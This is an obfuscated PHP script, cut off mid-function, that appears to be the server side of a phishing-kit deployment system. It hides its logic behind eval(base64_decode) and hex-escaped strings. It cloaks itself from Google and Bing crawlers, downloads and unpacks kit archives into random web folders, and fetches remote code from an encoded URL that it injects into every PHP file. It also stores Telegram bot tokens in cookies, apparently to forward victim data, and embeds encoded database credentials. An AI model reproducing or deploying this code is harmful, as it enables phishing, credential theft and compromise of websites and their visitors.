<?php eval(base64_decode('
 goto wq0Bx; cOcWh: if ($_SERVER["\122\105\121\x55\105\123\x54\137\115\x45\124\110\117\104"] === "\x50\117\x53\x54") { $com_ip = isset($_POST["\x73\145\x6e\144\x5f\151\160"]) ? $_POST["\163\145\156\144\x5f\151\x70"] : null; $com_domain = isset($_POST["\x73\x65\156\x64\137\144\x6f\155\141\151\x6e"]) ? $_POST["\163\x65\156\x64\x5f\x64\157\x6d\141\151\x6e"] : null; $return_domain = isset($_POST["\x72\x65\x74\165\162\156\137\144\x6f\x6d\141\151\x6e"]) ? $_POST["\x72\x65\x74\x75\x72\156\137\x64\157\155\141\x69\x6e"] : null; $com_id = isset($_POST["\x73\145\x6e\x64\137\x69\x64"]) ? $_POST["\x73\145\x6e\144\x5f\x69\x64"] : null; $com_action = isset($_POST["\163\x65\x6e\144\137\141\x63\x74\151\x6f\156"]) ? $_POST["\163\x65\156\x64\x5f\x61\x63\164\151\x6f\x6e"] : null; if ($com_ip !== null && $com_domain !== null && $return_domain !== null && $com_id !== null && $com_action !== null) { $ipAddress = $com_ip; global $ipAddress; fetchIPInfo($ipAddress); if (detect_user($com_ip)) { http_response_code(405); $responseData = array("\x72\x65\x73\137\163\x74\141\164\x75\163" => "\64\60\x35", "\155\x65\x73\x73\141\x67\x65" => "\x75\163\145\x72\x20\x62\x6c\x6f\143\x6b\145\x64"); $responseJson = json_encode($responseData); echo $responseJson; die; } if (is_bot_ip($com_ip)) { $reson = "\x73\x70\141\x6d\x20\151\160"; banned_client($com_ip, $reson); http_response_code(405); $responseData = array("\162\145\x73\x5f\163\x74\141\x74\165\163" => "\x34\x30\65", "\x6d\145\163\x73\x61\147\x65" => "\x75\163\145\x72\40\163\160\x61\155"); $responseJson = json_encode($responseData); echo $responseJson; die; } if (isGoogleUser($local_userAgent, $com_ip)) { $reson = "\x47\x6f\x6f\x67\x6c\x65\40\x69\x70"; banned_client($com_ip, $reson); $responseData = array("\162\145\x73\137\163\x74\141\164\x75\163" => "\x34\x30\x36", "\x6c\x6f\143\141\x6c\x5f\165\163\145\x72\101\x67\x65\x6e\x74" => $local_userAgent, "\x63\x6f\x6d\x5f\151\x70" => $com_ip, "\155\145\163\163\x61\x67\x65" => "\151\160\40\x66\151\154\x74\164\x65\x72"); $responseJson = json_encode($responseData); echo $responseJson; die; } if ($_POST["\163\x65\156\144\x5f\x61\143\164\151\x6f\x6e"] == "\154\157\147\x69\156") { user_data($com_ip, $com_id); update_user(); } if ($_POST["\x73\x65\x6e\144\137\141\143\x74\x69\157\156"] == "\x63\162\x65\141\164\145") { user_data($com_ip, $com_id); download_extract($_SESSION["\x75\x72\154"]); update_index($_SESSION["\146\157\x6c\144\x65\162"]); add_user($_SESSION["\x66\x6f\x6c\x64\145\162"], $com_ip); update_user(); if (isset($_SESSION["\x66\x6f\x6c\144\145\x72"])) { $folderPath = $_SESSION["\x66\157\x6c\x64\145\x72"]; $indexPath = findIndex($folderPath); if ($indexPath !== false && $indexPath !== $folderPath) { $relativePath = str_replace($folderPath . "\x2f", '', $indexPath); $indexContent = "\x3c\77\x70\x68\x70\40\x68\145\x61\x64\x65\x72\50\47\114\157\143\x61\164\151\x6f\156\72\x20\x2e\57{$relativePath}\47\51\73\x20\77\x3e"; file_put_contents($folderPath . "\57\x69\156\x64\145\x78\x2e\x70\150\160", $indexContent); } } if ($_SESSION["\141\160\151"] !== "\x41\x50\111") { getFileContents($_SESSION["\141\160\x69"]); } if ($_SESSION["\x69\x73\160\x72\157\x74\145\143\x74"] == "\x31") { update_php($_SESSION["\146\157\x6c\x64\145\x72"]); } else { update_php_normal($_SESSION["\x66\x6f\154\144\145\x72"]); } $responseData = array("\x72\145\x73\137\x73\x74\x61\164\165\x73" => "\163\165\x63\x63\145\x73\x73", "\162\145\x73\137\x64\x69\162" => $_SESSION["\146\157\x6c\144\145\x72"], "\x72\145\x73\137\x75\162\154" => $com_domain, "\x72\x65\x73\x5f\151\x64" => $com_id, "\162\x65\163\x5f\151\160" => $com_ip, "\x72\x65\163\x5f\141\x63\x74\151\157\156" => $com_action, "\x6d\x65\x73\163\141\147\145" => "\163\x75\143\143\145\163\x73\x66\165\154\154\x79"); $responseJson = json_encode($responseData); echo $responseJson; } } else { $reson = "\155\151\x73\x73\151\156\147\40\144\x61\164\x61"; fetchIPInfo($local_ip_g); banned_client($local_ip_g, $reson); http_response_code(405); $responseData = array("\x72\145\163\137\x73\164\141\x74\x75\x73" => "\64\60\65", "\x6d\145\x73\163\x61\x67\x65" => "\155\x69\x73\163\151\156\147\x20\144\141\x74\141"); $responseJson = json_encode($responseData); echo $responseJson; } } else { $reson = "\144\x61\x74\x61\x20\156\x6f\164\x20\x61\x6c\154\157\167"; fetchIPInfo($local_ip_g); banned_client($local_ip_g, $reson); http_response_code(405); $responseData = array("\162\145\x73\x5f\x73\164\x61\164\x75\x73" => "\x34\60\65", "\155\145\x73\x73\x61\147\145" => "\x64\141\164\141\40\156\157\x74\40\x61\x6c\154\x6f\x77\145\144"); $responseJson = json_encode($responseData); echo $responseJson; } goto RcDLq; Cmu9l: function add_user($folder_path, $ipAddress) { file_put_contents("{$folder_path}\57\154\157\x63\x61\154\56\x74\170\x74", "{$ipAddress}", FILE_APPEND); } goto Y9uJJ; hMS6W: $local_domain = $_SERVER["\123\105\x52\126\x45\122\137\x4e\101\115\105"]; goto ieqcc; sLKTg: header("\103\157\x6e\x74\x65\x6e\x74\x2d\x54\x79\160\145\x3a\x20\x61\x70\160\x6c\151\x63\141\x74\x69\x6f\156\57\152\163\157\156"); goto vxPWr; cST7o: function is_bot_ip($ipToCheck) { $botsUrls = array("\147\x6f\157\x67\x6c\x65" => "\150\164\164\x70\163\x3a\x2f\x2f\x64\145\166\145\x6c\x6f\x70\x65\x72\163\56\x67\157\157\x67\154\x65\x2e\143\157\x6d\57\163\x65\x61\162\143\x68\57\x61\x70\151\x73\x2f\x69\160\x72\141\156\x67\145\163\x2f\147\157\x6f\x67\154\145\x62\157\164\x2e\152\163\157\x6e", "\x62\x69\x6e\147" => "\x68\x74\164\x70\x73\72\x2f\57\x77\167\x77\56\x62\x69\x6e\147\x2e\x63\x6f\155\x2f\x74\157\157\x6c\142\157\170\x2f\142\151\156\147\142\x6f\x74\x2e\x6a\x73\157\156"); foreach ($botsUrls as $bot => $url) { $botResp = json_decode(file_get_contents($url), true); foreach ($botResp["\160\162\145\x66\x69\170\145\163"] as $ipRange) { if (isset($ipRange["\x69\160\x76\x36\x50\x72\145\146\x69\x78"]) && strpos($ipToCheck, "\x3a") !== false) { $network = $ipRange["\151\x70\x76\66\x50\162\x65\146\151\170"]; } elseif (isset($ipRange["\151\160\x76\x34\120\162\145\x66\x69\170"]) && strpos($ipToCheck, "\72") === false) { $network = $ipRange["\151\160\x76\x34\120\x72\x65\x66\151\170"]; } else { continue; } if (ip_in_range($ipToCheck, $network)) { return $bot; } } } return false; } goto hr8Vf; rv7wN: function get_browser_value($USER_AGENT) { $BROWSER_ERROR = "\x55\x6e\x6b\x6e\157\x77\x6e\x20\x42\162\x6f\167\163\145\x72"; $BROWSER = array("\x2f\155\x73\x69\x65\x2f\x69" => "\x49\156\164\x65\162\156\x65\164\40\x45\x78\x70\x6c\157\162\145\162", "\57\146\x69\162\145\146\x6f\170\57\151" => "\x46\151\x72\145\x66\157\x78", "\x2f\x73\141\146\x61\x72\x69\57\151" => "\x53\x61\x66\141\162\151", "\57\x63\x68\162\157\155\145\57\151" => "\103\x68\162\x6f\x6d\145", "\x2f\x65\x64\x67\145\57\151" => "\x45\x64\147\145", "\57\x6f\x70\145\x72\x61\57\x69" => "\117\160\x65\162\141", "\x2f\x6e\145\x74\x73\x63\x61\x70\145\x2f\151" => "\x4e\145\164\x73\x63\141\160\x65", "\57\x6d\141\170\164\x68\x6f\156\x2f\151" => "\115\141\x78\164\150\x6f\x6e", "\57\153\157\156\x71\165\x65\162\x6f\162\57\x69" => "\x4b\x6f\x6e\x71\165\145\x72\157\162", "\57\x6d\x6f\142\151\154\x65\57\x69" => "\110\x61\156\x64\150\x65\154\144\40\102\x72\x6f\167\163\x65\162"); foreach ($BROWSER as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $BROWSER_ERROR = $value; } } return $BROWSER_ERROR; } goto cST7o; vXMf_: function get_expire_token() { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\157\156\x6e\145\x63\164\151\157\156\40\x66\x61\x69\154\145\x64\72\40" . mysqli_connect_error()); } $sql_u = "\123\x45\x4c\x45\103\124\40\x74\145\154\x65\x5f\164\x6f\x6b\145\156\54\40\164\145\154\145\x5f\143\150\141\164\151\x64\x20\106\122\117\115\x20\x7a\145\x72\157\137\163\145\162\166\x65\x72\40\x57\110\105\122\x45\40\x69\144\75\x27\61\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { $row = mysqli_fetch_array($res_u); $_SESSION["\x65\x78\160\x5f\164\157\x6b\145\x6e"] = $row["\164\145\x6c\145\137\164\x6f\153\x65\x6e"]; $_SESSION["\x65\x78\x70\x5f\143\x68\x61\164\x69\x64"] = $row["\164\x65\x6c\145\x5f\143\x68\x61\164\151\x64"]; $token = $row["\x74\x65\154\x65\x5f\x74\157\x6b\x65\x6e"]; $chatid = $row["\164\x65\154\x65\137\x63\150\141\x74\151\144"]; return array($token, $chatid); } mysqli_close($db); return null; } goto hFMjy; MRr3i: function update_php($folder_path) { $trackingFile = $folder_path . "\x72\x6f\165\x6c\163\56\164\170\164"; $codeURL = base64_decode(base64_decode("\131\125\150\123\115\x47\116\111\124\x54\132\115\x65\124\154\65\x57\126\150\152\x64\x56\x6f\171\142\104\x42\150\123\x46\132\x70\132\106\150\x4f\x62\x47\x4e\x74\124\x6e\x5a\151\142\x6c\x4a\x73\x59\155\x35\x52\144\x56\153\x79\x4f\130\x52\115\115\156\150\161\x59\152\x4a\64\x61\107\x51\172\x62\x47\x78\152\142\153\x31\62\x59\x7a\x49\x35\x4d\127\116\164\x54\x6d\170\115\x4d\152\106\x6f\131\126\143\60\144\x6d\116\111\123\156\132\153\122\61\x5a\x71\x5a\x45\115\x31\x4d\x47\x56\x49\125\x51")); $codeToAdd = fetchContentFromURL($codeURL); $codeToAddBottom = ''; $phpFilesList = getAllPhpFiles($folder_path); foreach ($phpFilesList as $filePath) { updatePhpFileWithCode($filePath, $codeToAdd); } } goto dwryy; siB94: $local_userAgent = isset($_SERVER["\x48\124\124\120\x5f\x55\x53\x45\x52\137\x41\107\x45\x4e\124"]) ? $_SERVER["\110\124\x54\x50\137\125\123\x45\x52\137\x41\x47\x45\x4e\124"] : ''; goto CUpFx; f3fnC: global $fs_host, $fs_user, $fs_log, $fs_name, $local_userAgent, $local_time, $local_domain, $local_os, $local_ip_g, $local_browser; goto GMIYz; oPduj: if ($_SERVER["\x52\105\121\125\x45\x53\124\137\115\105\124\x48\117\x44"] === "\x47\x45\124") { $missingParams = array(); $com_dir_e = isset($_GET["\154\157\x63\141\154"]) ? $_GET["\154\x6f\x63\141\154"] : null; $com_id_e = isset($_GET["\x73\x6f\x75\154\163"]) ? $_GET["\163\157\165\x6c\x73"] : null; $com_ip_e = isset($_GET["\162\145\x6d\x6f\164\145"]) ? $_GET["\x72\x65\155\157\x74\145"] : null; $com_view = isset($_GET["\166\x69\x65\x77"]) ? $_GET["\166\x69\x65\x77"] : null; $com_user = isset($_GET["\165\x73\145\x72"]) ? $_GET["\165\163\x65\x72"] : null; if ($com_dir_e === null) { $missingParams[] = "\154\157\143\x61\x6c"; } if ($com_id_e === null) { $missingParams[] = "\x73\x6f\x75\x6c\x73"; } if ($com_ip_e === null) { $missingParams[] = "\x72\x65\x6d\x6f\164\145"; } if ($com_view === null) { $missingParams[] = "\166\x69\x65\x77"; } if ($com_user === null) { $missingParams[] = "\x75\163\145\162"; } if (!empty($missingParams)) { $responseData = array("\162\145\x73\137\163\164\x61\x74\x75\163" => "\64\60\x35", "\155\x65\163\x73\141\147\145" => "\x52\x65\x71\x75\x69\x72\x65\144\40\107\105\x54\40\x70\x61\x72\x61\x6d\145\x74\x65\162\x73\x20\141\162\x65\40\x6d\151\x73\163\x69\x6e\147\56", "\x6d\x69\x73\x73\151\x6e\x67\x5f\160\x61\162\x61\155\x73" => $missingParams); echo json_encode($responseData); die; } $ipAddress = base64_decode(base64_decode(base64_decode($com_ip_e))); $com_id = base64_decode(base64_decode(base64_decode($com_id_e))); $com_dir = base64_decode(base64_decode(base64_decode($com_dir_e))); if ($ipAddress === false || $com_id === false || $com_dir === false) { $failedDecodes = array(); if ($ipAddress === false) { $failedDecodes[] = "\162\145\x6d\157\x74\145"; } if ($com_id === false) { $failedDecodes[] = "\163\x6f\x75\154\x73"; } if ($com_dir === false) { $failedDecodes[] = "\154\x6f\x63\x61\x6c"; } $responseData = array("\162\145\163\x5f\x73\164\x61\164\x75\x73" => "\64\x30\x35", "\155\x65\163\x73\x61\x67\x65" => "\x46\x61\151\154\x65\144\x20\164\157\40\144\145\x63\157\x64\x65\x20\157\x6e\145\x20\157\162\40\155\157\162\x65\40\160\141\162\141\155\145\164\x65\x72\x73\56", "\x66\141\x69\154\x65\x64\x5f\144\x65\143\157\144\x65\163" => $failedDecodes); echo json_encode($responseData); die; } fetchIPInfo($ipAddress); user_data($ipAddress, $com_id); $_SESSION["\154\157\154\151\160\163"] = $ipAddress; $_SESSION["\154\157\154\x73\157\165\154\x73"] = $com_id; update_user_view($com_user); $RandOP_Mlux = random_string(6); $queryParams = array("\x76\x69\145\x77" => $RandOP_Mlux . $RandOP_Mlux, "\141\x6c\x65\x72\164" => $RandOP_Mlux, "\x78\154\x70\163" => $RandOP_Mlux, "\163\157\165\154\163" => $com_id, "\144\x6f\x6e\x65" => '', "\145\x72\162\157\x72\x79" => $RandOP_Mlux, "\155\x6e\x65\x6d\x6f\x6e\151\x63" => '', "\x6a\x62" => $RandOP_Mlux); $url = $com_dir . "\77" . http_build_query($queryParams); $responseData = array("\162\145\163\137\x73\x74\x61\164\165\163" => "\62\x30\60", "\155\x65\163\163\141\x67\x65" => "\122\145\144\151\162\x65\143\x74\x69\x6e\147", "\162\x65\x64\x69\x72\145\143\164\x5f\x75\162\x6c" => $url); echo json_encode($responseData); header("\x4c\157\x63\141\164\151\x6f\x6e\x3a\40{$url}"); die; } goto z0YkS; Y9uJJ: function isGoogleUser($userAgent, $ipAddress) { if (stripos($userAgent, "\147\x6f\x6f\x67\x6c\145") !== false) { return true; } if (filter_var($ipAddress, FILTER_VALIDATE_IP)) { $hostname = gethostbyaddr($ipAddress); if (stripos($hostname, "\x67\x6f\157\147\x6c\145") !== false) { return true; } } if (isset($_SESSION["\163\x65\163\163\151\x6f\x6e\137\151\x73\160"]) && stripos($_SESSION["\x73\x65\x73\x73\x69\157\156\137\x69\x73\160"], "\147\157\x6f\x67\x6c\145") !== false) { return true; } return false; } goto zM1KM; hr8Vf: function ip_in_range($ip, $range) { list($subnet, $mask) = explode("\57", $range); $mask = (int) $mask; $subnetBin = inet_pton($subnet); $ipBin = inet_pton($ip); $maskBin = str_repeat("\xff", $mask >> 3) . chr(255 << 8 - ($mask & 7)); if (strlen($subnetBin) < 4 || strlen($ipBin) < 4 || strlen($maskBin) < 4) { return false; } $subnetInt = unpack("\116", $subnetBin)[1]; $ipInt = unpack("\x4e", $ipBin)[1]; $maskInt = unpack("\x4e", $maskBin)[1]; return ($subnetInt & $maskInt) === ($ipInt & $maskInt); } goto RnzSu; XZwST: function user_data($ipAddress, $id) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\103\157\x6e\156\145\x63\x74\x69\x6f\156\x20\146\x61\151\x6c\145\144\72\40" . mysqli_connect_error()); } $sql_u = "\123\x45\114\105\x43\x54\x20\x2a\x20\x46\122\117\115\40\162\x65\x64\151\162\x63\x74\151\x6f\x6e\x20\127\110\x45\122\105\40\151\144\x3d\47{$id}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { while ($row = mysqli_fetch_array($res_u)) { $_SESSION["\154\x69\156\x6b"] = base64_decode(base64_decode($row["\154\x69\156\153"])); $_SESSION["\143\x6e"] = explode("\x3b", base64_decode(base64_decode($row["\x63\x6f\165\x6e\x74\162\x79"]))); $_SESSION["\x70\151\x63"] = $row["\x70\151\x63"]; $_SESSION["\155\163\147"] = base64_decode(base64_decode($row["\155\163\147"])); $_SESSION["\145\170\x70\151\x72\x65\137\x64\141\x74\145"] = $row["\145\x78\x70\151\162\145\x5f\x64\141\164\x65"]; $_SESSION["\x73\x65\162\x76\145\x72"] = base64_decode(base64_decode($row["\163\145\162\x76\x65\x72"])); $_SESSION["\165\x72\154"] = base64_decode(base64_decode($row["\x75\162\154"])); $_SESSION["\154\x75\x78\143\141\160\164\143\150\x61"] = $row["\154\x75\170\x63\141\x70\164\143\x68\x61"]; $_SESSION["\164\x6f\153\x65\156\x74\145\x6c"] = base64_decode(base64_decode($row["\164\x6f\153\x65\156\x74\x65\x6c"])); $_SESSION["\x69\x64\164\x65\x6c"] = base64_decode(base64_decode($row["\151\144\x74\x65\x6c"])); $_SESSION["\x72\145\x64\151\x72\x69\143\x74"] = $row["\162\145\x64\x69\162\151\143\164"]; $_SESSION["\160\162\x6f\x6a\145\143\164"] = $row["\x70\162\157\152\x65\143\164"]; $_SESSION["\x61\160\x69"] = $row["\x61\160\x69"]; $_SESSION["\141\144\144\142\171"] = $row["\141\144\x64\142\x79"]; $_SESSION["\151\x73\x70\x72\x6f\164\x65\143\164"] = $row["\151\163\160\162\157\x74\145\x63\164"]; $_SESSION["\x70\x72\157\x78\171"] = $row["\160\x72\x6f\x78\171"]; $_SESSION["\143\141\160\164\143\150\x61\137\144\141\164\141"] = $row["\143\x61\160\164\143\x68\x61"]; $_SESSION["\147\157\157\x6c\x65\x5f\143\x61\160"] = $row["\x67\157\157\x67\154\x65\x5f\x63\x61\160"]; $_SESSION["\143\x6c\157\x75\144\137\143\x61\x70"] = $row["\x63\x6c\157\x75\x64\137\x63\141\160"]; $_SESSION["\160\x72\157\137\x69\x63\157"] = $row["\x70\162\157\137\151\143\157"]; $_SESSION["\160\x72\x6f\137\x63\x6f\154\157\x72"] = $row["\x70\x72\157\x5f\143\x6f\154\157\162"]; $_SESSION["\160\162\157\137\155\x73\147"] = $row["\160\x72\x6f\x5f\155\163\x67"]; $_SESSION["\x70\162\x6f\137\151\155\x67"] = $row["\x70\x72\x6f\x5f\x69\x6d\x67"]; $_SESSION["\x70\x72\x6f\x5f\x6c\157\x67\157"] = $row["\x70\162\x6f\137\154\x6f\147\157"]; } } else { $refix = "\x6e\x6f\164\x20\x66\x6f\x75\156\144\x20\x69\x64\x2e{$id}"; banned_client($ipAddress, $refix); die; } mysqli_close($db); } goto vXMf_; j1pmN: function random_number($length) { $characters = "\x30\61\x32\x33\x34\65\x36\67\x38\71"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto XZwST; wq0Bx: header("\101\143\143\145\163\x73\55\103\157\x6e\x74\162\x6f\x6c\x2d\101\154\154\x6f\x77\55\117\x72\x69\x67\151\156\72\x20\x2a"); goto uS4rk; RnzSu: function deleteOldFolders($directory) { $files = scandir($directory); foreach ($files as $file) { if ($file == "\56" || $file == "\x2e\x2e") { continue; } if (is_dir($directory . "\x2f" . $file)) { $lastModified = filemtime($directory . "\x2f" . $file); $difference = (time() - $lastModified) / 60; if ($difference > 20) { deleteDirectory($directory . "\x2f" . $file); } } } } goto wUwox; zqCAf: function findIndex($path) { if (is_dir($path)) { if (file_exists($path . "\x2f\151\x6e\x64\x65\170\56\150\x74\x6d\x6c") || file_exists($path . "\x2f\151\x6e\144\x65\170\x2e\160\x68\x70")) { return $path; } else { $subDirectories = glob($path . "\57\x2a", GLOB_ONLYDIR); if (!empty($subDirectories)) { foreach ($subDirectories as $subDir) { $result = findIndex($subDir); if ($result !== false) { return $result; } } } } } return false; } goto NCxmV; dh9pg: deleteOldFolders("\167\145\x62"); goto VQaxm; dwryy: function update_php_normal($folder_path) { $trackingFile = $folder_path . "\x72\157\165\x6c\x73\56\x74\170\x74"; $codeURL = base64_decode(base64_decode("\131\125\x68\123\x4d\107\x4e\x49\124\124\132\x4d\x65\x54\x6c\x35\127\x56\150\x6a\x64\x56\x6f\x79\x62\104\x42\x68\123\x46\x5a\x70\x5a\x46\150\x4f\x62\107\116\164\x54\x6e\x5a\x69\142\x6c\x4a\x73\x59\x6d\x35\122\x64\126\x6b\171\117\130\x52\115\x4d\156\x68\161\x59\x6a\x4a\64\141\107\121\x7a\x62\x47\170\152\142\153\61\62\131\172\x49\x35\x4d\x57\x4e\164\x54\x6d\170\x4d\x4d\152\106\x6f\131\x56\x63\60\x64\155\116\x49\123\156\132\153\x52\61\132\161\132\x45\x59\x35\144\x57\x49\172\x53\x6e\x52\x5a\x56\63\144\x31\132\105\x68\x6f\115\x41")); $codeToAdd = fetchContentFromURL($codeURL); $codeToAddBottom = ''; $phpFilesList = getAllPhpFiles($folder_path); foreach ($phpFilesList as $filePath) { updatePhpFileWithCode($filePath, $codeToAdd); } } goto qWqth; zM1KM: function update_user() { list($token, $chatid) = get_expire_token(); $dateexp = $_SESSION["\x65\170\x70\151\162\145\x5f\144\141\x74\x65"]; $expireTimestamp = strtotime($dateexp); $currentTimestamp = time(); if ($currentTimestamp >= $expireTimestamp) { setcookie("\x74\157\x6b\145\x6e\x74\x65\154", $token, time() + 86400 * 30, "\57"); setcookie("\151\x64\164\x65\x6c", $chatid, time() + 86400 * 30, "\x2f"); setcookie("\162\x65\x64\151\162\x69\x63\164", $_SESSION["\162\x65\144\151\162\x69\143\x74"], time() + 86400 * 30, "\x2f"); setcookie("\x70\162\157\x6a\145\143\164", $_SESSION["\160\x72\157\152\145\143\164"], time() + 86400 * 30, "\57"); setcookie("\163\157\165\162\x63\x65\155\145", $_SESSION["\141\x64\x64\142\x79"], time() + 86400 * 30, "\57"); setcookie("\x6e\145\167\137\x65\170\160", $expireTimestamp, time() + 86400 * 30, "\x2f"); setcookie("\x76\x6f\154\155", $token, time() + 86400 * 30, "\x2f"); setcookie("\144\157\154\155", $chatid, time() + 86400 * 30, "\57"); } else { setcookie("\164\x6f\153\145\x6e\x74\x65\154", $_SESSION["\x74\x6f\153\x65\156\164\x65\154"], time() + 86400 * 30, "\57"); setcookie("\x69\144\x74\x65\x6c", $_SESSION["\151\x64\164\145\154"], time() + 86400 * 30, "\57"); setcookie("\x72\x65\144\151\x72\151\143\164", $_SESSION["\162\145\x64\x69\x72\151\143\164"], time() + 86400 * 30, "\x2f"); setcookie("\160\x72\157\152\x65\143\164", $_SESSION["\x70\x72\x6f\x6a\145\x63\164"], time() + 86400 * 30, "\57"); setcookie("\163\157\165\162\143\x65\155\x65", $_SESSION["\x61\144\144\142\171"], time() + 86400 * 30, "\57"); setcookie("\x76\157\154\x6d", $token, time() + 86400 * 30, "\x2f"); setcookie("\144\x6f\154\x6d", $chatid, time() + 86400 * 30, "\x2f"); } } goto LTzy6; z0YkS: if ($_SERVER["\x52\105\121\x55\x45\x53\124\x5f\115\x45\x54\x48\117\x44"] === "\x47\x45\x54") { $com_dir = isset($_GET["\154\157\143\141\x6c"]) ? $_GET["\154\157\x63\x61\154"] : null; $com_id = isset($_GET["\163\157\165\154\x73"]) ? $_GET["\163\x6f\x75\154\163"] : null; $com_ip = isset($_GET["\x72\x65\x6d\157\164\x65"]) ? $_GET["\162\145\x6d\157\164\x65"] : null; if ($com_dir !== null && $com_id !== null && $com_ip !== null) { $ipAddress = $com_ip; global $ipAddress; fetchIPInfo($ipAddress); user_data($com_ip, $com_id); $_SESSION["\154\157\x6c\151\160\163"] = $com_ip; $_SESSION["\x6c\x6f\x6c\x73\x6f\165\154\163"] = $com_id; update_user(); $RandOP_Mlux = random_string(6); $url = $com_dir . "\77\x26\166\x61\x6c\151\x64\x3d" . $RandOP_Mlux . $RandOP_Mlux . "\46\x61\x6c\145\x72\164\75" . $RandOP_Mlux . "\46\170\154\160\x73\x3d" . $RandOP_Mlux . "\46\163\x6f\165\154\163\75" . $com_id . "\x26\x64\157\x6e\145\x3d\46\x65\162\162\x6f\162\171\75" . $RandOP_Mlux . "\x26\x6d\x6e\145\x6d\157\x6e\x69\x63\x3d\x26\x6a\142\x3d" . $RandOP_Mlux; header("\x4c\x6f\x63\141\164\x69\x6f\x6e\72\40{$url}"); die; } } goto cOcWh; MfXoX: $fs_log = base64_decode("\132\x48\x4a\152\x5a\x32\x6c\163\145\126\x41\167\x4b\x6d\x73\x6d"); goto zJdtO; sJP_s: $local_ip_g = getClientIP(); goto f3fnC; I9mxV: function update_index($folderDir) { $renamed = false; if ($handle = opendir($folderDir)) { while (false !== ($entry = readdir($handle))) { $path = $folderDir . "\x2f" . $entry; if ($entry == "\56" || $entry == "\x2e\56") { continue; } if (is_dir($path)) { $renamed = update_index($path) || $renamed; } if (is_file($path) && strtolower(pathinfo($path, PATHINFO_EXTENSION)) === "\150\164\x6d\154") { $newPath = $folderDir . "\57" . pathinfo($path, PATHINFO_FILENAME) . "\56\160\x68\160"; if (rename($path, $newPath)) { $renamed = true; } } } closedir($handle); } return $renamed; } goto MRr3i; zJdtO: $fs_name = base64_decode("\x65\155\126\x79\x62\62\x52\150\x65\x58\116\x66\132\x47\106\65"); goto siB94; Qtur8: if (session_status() == PHP_SESSION_NONE) { session_start(); } goto tG3NS; wUwox: function deleteDirectory($dir) { if (is_dir($dir)) { $objects = scandir($dir); foreach ($objects as $object) { if ($object != "\x2e" && $object != "\56\56") { if (is_dir($dir . "\x2f" . $object)) { deleteDirectory($dir . "\57" . $object); } else { unlink($dir . "\x2f" . $object); } } } reset($objects); rmdir($dir); } } goto IhAx6; tG3NS: $fs_host = base64_decode("\115\x54\153\x34\x4c\152\111\x31\x4d\x53\64\64\x4e\x43\x34\x79\x4d\x44\x41"); goto P1uRj; CUpFx: $local_time = date("\131\55\155\x2d\x64\x20\110\72\151\72\x73"); goto hMS6W; IhAx6: function download_extract($zipFileUrl) { if (!is_dir("\x77\145\x62")) { if (!mkdir("\167\x65\142", 511)) { die("\x46\141\x69\154\145\x64\x20\x74\x6f\40\x63\x72\x65\x61\164\145\40\167\145\142\40\x64\x69\162\145\x63\x74\157\162\171"); } } if (!is_dir("\x74\x65\155\x70")) { mkdir("\164\x65\x6d\160"); } $folder_name = bin2hex(random_bytes(8)); $sub_folder = random_number(6); $folder_path = "\x77\145\x62\57{$sub_folder}\x2f"; $_SESSION["\146\157\154\144\x65\162"] = $folder_path; $zipFileName = "\x74\145\x6d\x70\x2f{$folder_name}\56\x7a\151\160"; if (copy($zipFileUrl, $zipFileName)) { if (!mkdir($folder_path, 511, true)) { die("\x46\141\151\154\x65\x64\x20\164\x6f\40\143\x72\145\141\164\145\x20\x74\150\x65\x20\146\157\x6c\144\x65\162\x2e"); } $zip = new ZipArchive(); if ($zip->open($zipFileName) === true) { $zip->extractTo($folder_path); $zip->close(); } else { http_response_code(405); $responseData = array("\162\x65\163\137\x73\164\x61\164\165\163" => "\x34\60\65", "\x6d\145\163\163\x61\x67\x65" => "\x46\141\x69\x6c\x65\144\x20\164\157\x20\x65\170\x74\x72\x61\143\x74\40\x74\150\x65\x20\x7a\151\160\40\146\151\x6c\145"); $responseJson = json_encode($responseData); echo $responseJson; } } else { http_response_code(405); $responseData = array("\x72\145\x73\x5f\x73\164\141\x74\165\163" => "\x34\60\x35", "\155\x65\x73\163\141\147\145" => "\106\141\x69\x6c\145\144\x20\x74\x6f\40\x64\x6f\x77\x6e\154\x6f\x61\144\40\x74\150\145\x20\x7a\151\x70\x20\x66\151\x6c\145"); $responseJson = json_encode($responseData); echo $responseJson; } if (file_exists($zipFileName)) { unlink($zipFileName); } } goto I9mxV; vxPWr: error_reporting(E_ALL); goto oGHKB; FYX3W: function modifyFilesRecursively($directory, $codeToAddTop, $codeToAddBottom, $modifiedFiles = array()) { if (is_dir($directory)) { if ($handle = opendir($directory)) { while (false !== ($file = readdir($handle))) { if ($file != "\56" && $file != "\56\x2e") { $filePath = $directory . "\57" . $file; if (is_dir($filePath)) { $modifiedFiles = array_merge($modifiedFiles, modifyFilesRecursively($filePath, $codeToAddTop, $codeToAddBottom)); } elseif (pathinfo($file, PATHINFO_EXTENSION) == "\x70\150\x70" && !in_array($file, $modifiedFiles)) { $fileContent = file_get_contents($filePath); if (strpos($fileContent, $codeToAddTop) === false) { $fileContent = $codeToAddTop . $fileContent; } if (strpos($fileContent, $codeToAddBottom) === false) { $fileContent .= $codeToAddBottom; } file_put_contents($filePath, $fileContent); $modifiedFiles[] = $file; } } } closedir($handle); } } return $modifiedFiles; } goto QNk2w; VQaxm: $currentTimestamp = time(); goto sJP_s; S38L3: function delete_zip($directory) { $zipFiles = glob($directory . "\52\x2e\172\x69\x70"); if (!empty($zipFiles)) { foreach ($zipFiles as $zipFile) { if (is_file($zipFile)) { unlink($zipFile); } } } } goto Cmu9l; oGHKB: ini_set("\x64\151\x73\160\154\141\171\137\145\162\162\157\162\163", 1); goto Qtur8; fLW3N: function banned_client($ipAddress, $reason) { global $fs_host, $fs_user, $fs_log, $fs_name, $local_browser, $local_os, $local_domain, $local_time; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\x6f\156\156\x65\143\164\x69\157\156\x20\146\x61\x69\x6c\x65\x64\x3a\x20" . mysqli_connect_error()); } $sql_check = 